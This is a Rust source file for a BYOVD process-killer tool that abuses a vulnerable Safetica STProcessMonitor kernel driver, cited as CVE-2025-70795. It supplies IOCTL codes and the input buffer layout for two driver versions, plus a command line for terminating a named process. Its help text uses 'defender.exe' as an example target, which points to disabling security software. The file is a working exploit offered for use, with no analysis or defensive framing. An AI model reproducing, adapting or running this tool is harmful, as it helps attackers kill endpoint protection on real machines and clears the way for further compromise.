use byovd_lib::{DriverConfig, Result};
use clap::Parser;
use winapi::um::winnt::{GENERIC_EXECUTE, GENERIC_READ, GENERIC_WRITE};
use winapi::um::winsvc::SERVICE_ALL_ACCESS;

// ============================================================================
// Driver Configuration - STProcessMonitor (Safetica)
// CVE-2025-70795
//
// Supports two driver versions with different IOCTL codes and access requirements:
//   - v11.11.4  (114)  : IOCTL 0xB822200C, low-privilege
//   - v11.26.18 (2618) : IOCTL 0xB822A00C, requires LocalSystem
// ============================================================================

#[derive(Clone, Copy)]
enum DriverVersion {
    V114,
    V2618,
}

struct STProcessMonitorDriver {
    version: DriverVersion,
}

impl STProcessMonitorDriver {
    fn new(version: DriverVersion) -> Self {
        Self { version }
    }
}

impl DriverConfig for STProcessMonitorDriver {
    fn driver_name(&self) -> &str {
        "STProcessMonitor"
    }

    fn driver_file(&self) -> &str {
        match self.version {
            DriverVersion::V114 => "STProcessMonitor_v114.sys",
            DriverVersion::V2618 => "STProcessMonitor_v2618.sys",
        }
    }

    fn device_path(&self) -> &str {
        "\\\\.\\STProcessMonitorDriver"
    }

    fn ioctl_code(&self) -> u32 {
        match self.version {
            DriverVersion::V114 => 0xB822200C,
            DriverVersion::V2618 => 0xB822A00C,
        }
    }

    fn device_access(&self) -> u32 {
        match self.version {
            DriverVersion::V114 => SERVICE_ALL_ACCESS,
            DriverVersion::V2618 => GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE,
        }
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        // 8-byte buffer with PID as DWORD in the first 4 bytes
        let mut buf = vec![0u8; 8];
        buf[..4].copy_from_slice(&pid.to_ne_bytes());
        buf
    }

    /// Version 2618 requires LocalSystem privileges.
    fn preflight_check(&self) -> Result<()> {
        if let DriverVersion::V2618 = self.version {
            byovd_lib::ensure_running_as_local_system()?;
        }
        Ok(())
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "STProcessMonitor-Killer", version, author = "BlackSnufkin, wwwab")]
#[command(about = "BYOVD process killer using STProcessMonitor driver (CVE-2025-70795)")]
#[command(after_help = "EXAMPLES:\n  \
    STProcessMonitor-Killer.exe --version 114 -n notepad.exe\n  \
    STProcessMonitor-Killer.exe --version 2618 -n defender.exe")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,

    /// Driver version: 114 (v11.11.4, low-priv) or 2618 (v11.26.18, LocalSystem)
    #[arg(short = 'v', long = "version", required = true, value_parser = ["114", "2618"])]
    driver_version: String,

    /// Custom driver file path (overrides default)
    #[arg(short = 'd', long = "driver")]
    driver_path: Option<String>,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();

    let version = match cli.driver_version.as_str() {
        "114" => DriverVersion::V114,
        "2618" => DriverVersion::V2618,
        _ => unreachable!("clap validates this"),
    };

    let config = STProcessMonitorDriver::new(version);

    println!(
        "[*] Using STProcessMonitor driver version: {}",
        cli.driver_version
    );

    byovd_lib::run(
        &config,
        &cli.process_name,
        cli.driver_path.as_deref(),
    )
}
